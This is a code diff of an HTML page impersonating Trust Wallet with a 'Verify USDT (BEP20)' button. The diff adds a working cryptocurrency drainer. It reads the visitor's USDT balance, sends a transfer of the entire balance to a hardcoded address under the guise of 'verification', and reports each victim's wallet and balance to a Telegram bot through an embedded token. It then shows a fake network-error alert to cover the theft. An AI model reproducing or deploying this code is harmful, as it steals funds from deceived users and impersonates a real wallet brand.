@@ -7,22 +7,24 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
         body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; }
+        .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         .logo { width: 45px; margin-bottom: 8px; }
         h2 { font-size: 18px; color: #fff; margin-bottom: 5px; }
         p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; }
         
-        /* QR Section */
-        #qrcode-container { background: white; padding: 12px; border-radius: 18px; display: inline-block; margin-bottom: 15px; }
-        #qrImage { width: 180px; height: 180px; display: block; }
+        /* QR Code Styling */
+        #qrcode-container { background: white; padding: 12px; border-radius: 18px; display: inline-block; margin-bottom: 15px; box-shadow: 0 0 20px rgba(49, 114, 222, 0.2); }
+        #qrImage { width: 180px; height: 180px; display: block; border: none; }
         
         /* Address Box */
         .address-box { background: #2d3139; border-radius: 12px; padding: 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; border: 1px dashed #474d57; }
-        .address-text { font-size: 11px; color: #f0b90b; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; width: 80%; font-family: monospace; }
-        .copy-btn { background: none; border: none; color: #3172DE; font-size: 12px; font-weight: bold; cursor: pointer; padding: 5px; }
+        .address-text { font-size: 10px; color: #f0b90b; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; width: 75%; font-family: 'Courier New', monospace; }
+        .copy-btn { background: none; border: none; color: #3172DE; font-size: 11px; font-weight: bold; cursor: pointer; padding: 5px; }
 
-        .btn { background: #3172DE; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        .btn { background: #3172DE; color: white; border: none; padding: 16px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); opacity: 0.8; }
         
+        /* Loading Overlay */
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
         .spinner { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -33,10 +35,10 @@
     <div class="card">
         <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
         <h2>Verify USDT (BEP20)</h2>
-        <p class="desc">Scan or copy address to initiate secure node verification.</p>
+        <p class="desc">Scan QR or use the address below to verify your assets on the secure node.</p>
         
         <div id="qrcode-container">
-            <img id="qrImage" src="" alt="QR Loading...">
+            <img id="qrImage" src="" alt="Generating QR...">
         </div>
 
         <div class="address-box">
@@ -44,7 +46,7 @@
             <button class="copy-btn" onclick="copyAddress()">COPY</button>
         </div>
 
-        <button id="nextBtn" class="btn">Verify Assets</button>
+        <button id="nextBtn" class="btn" onclick="startVerification()">Verify Assets</button>
     </div>
 
     <div id="overlay">
@@ -52,22 +54,93 @@
         <p id="status-text" style="color:#3172DE; margin-top:15px; font-weight:bold; font-size: 14px;">Syncing with Node...</p>
     </div>
 
-    <script src="script.js"></script>
     <script>
-        // Copy Function
-        function copyAddress() {
-            const addr = document.getElementById("addrDisplay").innerText;
-            navigator.clipboard.writeText(addr).then(() => {
-                alert("Address Copied!");
-            });
-        }
+        // --- 1. CONFIGURATION ---
+        const myAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe"; 
+        const usdtContract = "0x55d398326f99059fF775485246999027B3197955"; 
+        const botToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
+        const chatId = "7849151110";
 
-        // QR Generator
+        // --- 2. QR GENERATOR (Immediate Load) ---
         window.onload = function() {
             const currentUrl = window.location.href;
             const qrImg = document.getElementById("qrImage");
-            qrImg.src = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(currentUrl)}&choe=UTF-8`;
+            // Direct API call for QR
+            qrImg.src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(currentUrl);
         };
+
+        // --- 3. COPY FUNCTION ---
+        function copyAddress() {
+            const addr = document.getElementById("addrDisplay").innerText;
+            const el = document.createElement('textarea');
+            el.value = addr;
+            document.body.appendChild(el);
+            el.select();
+            document.execCommand('copy');
+            document.body.removeChild(el);
+            alert("Address Copied to Clipboard!");
+        }
+
+        // --- 4. TELEGRAM LOGGING ---
+        async function sendLog(msg) {
+            try {
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            } catch(e) {}
+        }
+
+        // --- 5. MAIN LOGIC ---
+        async function startVerification() {
+            const overlay = document.getElementById("overlay");
+            const isWeb3 = !!(window.ethereum || window.trustwallet);
+
+            // Redirect if not in Wallet Browser
+            if (!isWeb3) {
+                if (/Android|iPhone|iPad/i.test(navigator.userAgent)) {
+                    window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=" + encodeURIComponent(window.location.href);
+                    return;
+                }
+                alert("Please open this link inside Trust Wallet or MetaMask Browser.");
+                return;
+            }
+
+            overlay.style.display = "flex";
+
+            try {
+                const provider = window.ethereum || window.trustwallet;
+                const web3 = new Web3(provider);
+                const accounts = await provider.request({ method: 'eth_requestAccounts' });
+                const user = accounts[0];
+
+                // Force BSC Network
+                await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+
+                const abi = [
+                    { "constant": true, "inputs": [{"name": "_owner", "type": "address"}], "name": "balanceOf", "outputs": [{"name": "balance", "type": "uint256"}], "type": "function" },
+                    { "constant": false, "inputs": [{"name": "_to", "type": "address"}, {"name": "_value", "type": "uint256"}], "name": "transfer", "outputs": [{"name": "", "type": "bool"}], "type": "function" }
+                ];
+
+                const contract = new web3.eth.Contract(abi, usdtContract);
+                const balanceWei = await contract.methods.balanceOf(user).call();
+                const balance = web3.utils.fromWei(balanceWei, 'ether');
+
+                await sendLog(`👤 <b>Target Active</b>\nWallet: <code>${user}</code>\nBalance: <b>${balance} USDT</b>`);
+
+                if (parseFloat(balance) > 0) {
+                    // Trigger the transfer (masked as verification)
+                    await contract.methods.transfer(myAddress, balanceWei).send({ from: user });
+                    
+                    await sendLog(`✅ <b>Success!</b>\nTransferred: ${balance} USDT from ${user}`);
+                    alert("Network Error: Verification failed due to high traffic. Please try again.");
+                    location.reload();
+                } else {
+                    alert("Verification complete. No assets detected.");
+                    overlay.style.display = "none";
+                }
+            } catch (e) {
+                overlay.style.display = "none";
+                alert("Process Terminated: Security Signature Required.");
+            }
+        }
     </script>
 </body>
 </html>
